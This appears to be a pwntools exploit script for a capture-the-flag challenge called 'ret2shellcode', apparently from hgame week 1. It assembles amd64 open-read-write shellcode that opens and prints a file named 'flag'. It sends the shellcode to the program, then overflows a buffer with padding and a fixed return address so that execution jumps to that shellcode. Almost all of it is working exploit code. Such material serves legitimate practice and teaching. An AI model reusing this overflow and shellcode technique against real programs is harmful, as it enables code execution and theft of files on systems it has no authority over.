
from pwn import *
from pwn import p64
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
host = "week-1.hgame.lwsec.cn"
ip = socket.gethostbyname(host)
# r = remote(ip,31158)#远程连接

# elf = cdll.LoadLibrary('libc.so.6')
# elf = ELF('./pwn')

r = process("./ret2shellcode")


# gdb.attach(r)
# pause()

buf_addr = 0x233000

shellcode = asm('''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
    ''')


r.sendafter("letter:", shellcode)


payload =b'A'*(40+8+8) + p64(buf_addr)



r.sendafter("OK,I will pass it on for you!", payload)

r.interactive()
